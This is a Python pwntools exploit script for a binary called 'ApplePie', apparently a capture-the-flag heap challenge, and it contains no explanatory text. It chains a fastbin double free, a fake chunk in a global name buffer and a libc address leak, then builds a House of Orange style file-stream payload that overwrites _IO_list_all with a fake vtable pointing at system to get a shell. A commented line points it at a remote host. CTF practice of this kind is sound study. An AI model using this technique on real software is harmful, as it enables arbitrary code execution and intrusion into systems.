#!/usr/bin/env python
# -*- coding: utf-8-*-
from pwn import*
context(os="linux", arch="amd64")

if __name__ =='__main__':
    uu32    = lambda data   :u32(data.ljust(4,b'\0'))
    uu64    = lambda data   :u64(data.ljust(8,b'\0'))

    g_fname = args.FNAME if args.FNAME else "./ApplePie"
    g_libname = args.LIB if args.LIB else "/lib/x86_64-linux-gnu/libc.so.6"

    p = process(g_fname)
    # p=remote("10.10.2.139",9999)
    context.log_level ='debug'

    s = p.send
    sl = p.sendline
    r = p.recv
    ru = p.recvuntil
    sa = p.sendafter
    sla = p.sendlineafter

    def getpid():
        log.info("pid: %d", p.proc.pid)
        pause()

    def choice(aid):
        sa('choice :\n', str(aid))
        
    def add(asize, acon):
        choice(1)
        sa('size:',str(asize))
        sa('name:\n',acon)
    
    def free(aid):
        choice(2)
        sa('id:', str(aid))
        
    def edit_name(name):
        choice(3)
        sa('name:',name)
        
    heap_addr = 0x602140
    name =  0x602040
    # fake =  p64(0)+p64(0xd1)
    # fake += b'\x00'*0xc0
    # fake += p64(0)+p64(0x21)
    # fake += p64(0)*3+p64(0x21)
    fake = flat([
        0, 0xd1, '\0'*0xc0, 
        0, 0x21, 0, 0,
        0, 0x21
    ])
    log.info("len(fake)=%#x", len(fake))
    
    sa('name:\n',fake)
    
    
    #ctx.debug()
    add(0x10, '0')
    add(0x10, '1')
    free(0)
    free(1)
    free(0)
    
    #ctx.debug()
    add(0x10, p64(heap_addr - 0x10))#2
    add(0x10, '3')
    add(0x10, '4')
    add(0x18, p64(name + 0x10))
    
    #ctx.debug()
    free(0)
    #ctx.debug()
    edit_name('A'*0x10)
    ru('to '+'A'*0x10)
    libc_base = uu64(r(6)) - 0x389b78 #0x3c4b78
    log.success("libc_base = %#x", libc_base)
    
    libc = ELF(g_libname)
    io_list_all = libc_base+libc.symbols['_IO_list_all']
    system = libc_base+libc.symbols['system']
    fake_vtable = name + 0xe0 - 0x18
    payload =   b'/bin/sh\x00' + p64(0x61)
    payload +=  p64(0xddaa) + p64(io_list_all - 0x10)
    payload +=  p64(2) + p64(3)
    payload =   payload.ljust(0xd8, b'\x00')
    payload +=  p64(fake_vtable)
    payload +=  p64(system)#0xe0

    getpid()
    edit_name(payload)
    choice(1)
    #ctx.debug()
    sa('size:',"32")
    
    #ctx.debug()
    p.interactive()
